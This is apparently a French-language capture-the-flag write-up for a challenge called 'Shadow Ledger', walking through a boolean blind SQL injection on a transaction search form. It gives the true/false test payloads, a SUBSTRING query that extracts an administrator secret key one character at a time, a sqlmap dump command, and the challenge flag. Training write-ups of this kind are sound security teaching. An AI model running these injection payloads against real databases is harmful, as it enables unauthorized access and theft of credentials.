# Shadow Ledger

Le challenge propose un formulaire de recherche de transaction qui ne renvoie aucune donnée précise, seulement si la transaction existe ou non. C'est le cas classique d'une Blind SQL Injection booléenne.

L'objectif est d'extraire la colonne `secret_key` de la table `administrators`.

1. **Identifier le comportement**
En cherchant un ID valide (`TXN-12345`), on obtient "Transaction trouvée".
Si on ajoute une condition Vraie : `TXN-12345' AND 1=1 -- ` -> Transaction trouvée.
Si on ajoute une condition Fausse : `TXN-12345' AND 1=0 -- ` -> Transaction non trouvée.
L'injection est confirmée.

2. **Extraction lettre par lettre**
Il faut deviner le secret caractère par caractère en utilisant la fonction `SUBSTRING()`. On pose des questions fermées à la BDD.
Par exemple, "Est-ce que la première lettre est un 'H' ?" :
`TXN-12345' AND (SELECT SUBSTRING(secret_key, 1, 1) FROM administrators LIMIT 1) = 'H' -- `
Si ça renvoie "trouvé", on a notre première lettre. Sinon, on teste une autre lettre.

3. **Automatisation**
Faire ça à la main prendrait des heures. On peut soit écrire un petit script Python qui boucle sur toutes les lettres de l'alphabet, soit utiliser un outil comme **SQLmap** :
```bash
sqlmap -u "http://<ip>/?search=TXN-12345" -p "search" --technique=B -T administrators -C secret_key --dump
```

Une fois le processus automatisé terminé, on obtient la chaîne complète.

**Flag:** `HTS{Bl1nd_SQLi_R3qu1r3s_P4t13nc3}`
 